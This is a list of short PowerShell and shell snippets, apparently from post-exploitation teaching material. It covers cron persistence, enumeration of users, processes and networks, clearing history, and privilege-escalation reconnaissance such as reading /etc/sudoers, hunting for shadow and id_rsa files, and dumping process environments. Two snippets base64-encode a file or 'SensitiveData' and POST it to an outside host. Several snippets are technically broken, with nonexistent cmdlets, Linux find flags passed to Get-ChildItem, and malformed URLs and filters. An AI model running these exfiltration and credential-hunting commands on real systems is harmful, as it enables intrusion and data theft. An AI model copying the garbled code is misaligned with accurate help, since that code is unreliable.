["```\n # Edit crontab\ncrontab -e\n# Add the following line to run a PowerShell script every minute\n* * * * * /usr/bin/pwsh /path/to/persistence.ps1\n```", "```\n # Check for processes running with elevated privileges\nGet-Process | Where-Object { $_.Elevated -eq $true } | Select-Object ProcessName, UserName\n```", "```\n # List all users and their groups\nGet-LocalUser | ForEach-Object {\n    $user = $_\n    $groups = Get-LocalGroup -Member $user.Name | Select-Object -ExpandProperty Name\n    \"$($user.Name) : $($groups -join ', ')\"\n}\n```", "```\n # List network interfaces and configurations\nGet-NetIPAddress | Select-Object InterfaceAlias, IPAddress, PrefixLength\n```", "```\n # List network interfaces and configurations\nInvoke-Expression -Command \"ip addr show\"\n```", "```\n # List files in the /etc directory\nGet-ChildItem -Path /etc\n```", "```\n # Encode and exfiltrate a file\n$fileContent = Get-Content /path/to/sensitive-file.txt -Raw\n$encodedContent = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($fileContent))\nInvoke-RestMethod -Uri \"http s://snowcap cyber.com/upload\" -Method POST -Body $encodedContent\n```", "```\n # Clear Bash history\nClear-History\n```", "```\n # Get information about a specific user\nGet-User -Name andrewblyth\n```", "```\n # Get processes for a specific user\nGet-Process | Where-Object { $_.UserName -eq \"andrewblyth\" }\n```", "```\n # Get network connections for a specific user\nGet-NetTCPConnection -OwningUser \"andrewblyth\"\n```", "```\n # List files and directories for a specific user\nGet-ChildItem -Path /home/andrewblyth\n```", "```\n # Get installed software for a specific user\nGet-InstalledSoftware -User \"andrewblyth\"\n```", "```\n # Get recent login events for a specific user\nGet-WinEvent -LogName auth.log -FilterXPath \"*[System[(EventID=1) and EventData[Data[@Name='user']='$andrewblyth]]]\" -MaxEvents 10\n```", "```\n # Encode and send data to a remote server\n$data = \"SensitiveData\"\n$encodedData = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))\nInvoke-WebRequest -Uri \"https://snpowcapcyber.com.com/upload.php\" -Method POST -Body $encodedData\n```", "```\n # Get file permissions for a specific file\nGet-Acl /path/to/file.txt\n```", "```\n # Grant read and write permissions to a user\n$filePath = \"/path/to/file.txt\"\n$user = \" andrewblyth \"\n$rule = New-Object System.Security.AccessControl.FileSystemAccessRule($user, \"Read, Write\", \"Allow\")\n(Get-Acl $filePath).AddAccessRule($rule) | Set-Acl $filePath\n```", "```\n # Add execute permissions to a group\n$filePath = \"/path/to/file.sh\"\n$group = \"developers\"\n$rule = New-Object System.Security.AccessControl.FileSystemAccessRule($group, \"ExecuteFile\", \"Allow\")\n(Get-Acl $filePath).AddAccessRule($rule) | Set-Acl $filePath\n```", "```\n # Remove write permissions from a user\n$filePath = \"/path/to/data.txt\"\n$user = \"alice\"\n$acl = Get-Acl $filePath\n$rule = $acl.Access | Where-Object { $_.IdentityReference -eq $user -and $_.FileSystemRights -eq \"Write\" }\n$acl.RemoveAccessRule($rule) | Set-Acl $filePath\n```", "```\n # Change file ownership to a different user\n$filePath = \"/path/to/file.txt\"\n$newOwner = \"andrewblyth\"\n(Get-Acl $filePath).SetOwner([System.Security.Principal.NTAccount] $newOwner) | Set-Acl $filePath\n```", "```\n # Check effective permissions for a user\n$filePath = \"/path/to/document.pdf\"\n$user = \"guest\"\n(Get-Acl $filePath).Access | Where-Object { $_.IdentityReference -eq $user }\n```", "```\n # Configure directory to inherit permissions\n$directoryPath = \"/path/to/folder\"\n$acl = Get-Acl $directoryPath\n$acl.SetAccessRuleProtection($false, $true)\nSet-Acl $directoryPath $acl\n```", "```\n # List all ACEs in an ACL\n$filePath = \"/path/to/data.txt\"\n(Get-Acl $filePath).Access\n```", "```\n # Check current user's privileges\nwhoami\n```", "```\n # Enumerate local groups and their members\nGet-LocalGroup | ForEach-Object {\n    $group = $_\n    Write-Host \"Group: $($group.Name)\"\n    Get-LocalGroupMember -Group $group.Name\n}\n```", "```\n # Check sudoers file\ncat /etc/sudoers\n```", "```\n # Find executable files with lax permissions\nGet-ChildItem -Path / -type f -executable | ForEach-Object {\n    $file = $_\n    Write-Host \"Executable File: $($file.FullName)\"\n}\n```", "```\n # Check for services with weak configurations\nGet-Service | ForEach-Object {\n    $service = $_\n    Write-Host \"Service: $($service.DisplayName), StartType: $($service.StartType)\"\n}\n```", "```\n # List cron jobs\ncrontab -l\n```", "```\n # Find world-writable directories\nGet-ChildItem -Path / -type d | Where-Object { $_.Attributes -match \"OtherWrite\" } | ForEach-Object {\n    $dir = $_\n    Write-Host \"World-Writable Directory: $($dir.FullName)\"\n}\n```", "```\n # Identify processes with DLL hijacking potential\nGet-Process | ForEach-Object {\n    $process = $_\n    $dllPath = Join-Path $process.MainModule.FileName -ChildPath \"evil.dll\"\n    if (-not (Test-Path $dllPath)) {\n        Write-Host \"Potential DLL hijacking found in $($process.ProcessName). Exploiting...\"     }\n}\n```", "```\n # Search for password files\nGet-ChildItem -Path / -type f -name \"passwd*\" -or -name \"shadow\" -or -name \"sudoers\" -or -name \"id_rsa\" -or -name \"id_dsa\" -or -name \"*.key\"\n```", "```\n # Check for wildcard injection vulnerabilities\nGet-ChildItem -Path / -include \"*.log*\" -Recurse\n```", "```\n # Find setuid and setgid binaries\nfind / -type f -perm /4000 -or -perm /2000 2>/dev/null\n```", "```\n # Check environment variables\nGet-ChildItem -Path /proc/*/environ -type f | ForEach-Object {\n    $envContents = Get-Content $_.FullName\n    Write-Host \"Environment Variables in $($_.FullName):\"\n    Write-Host $envContents\n}\n```"]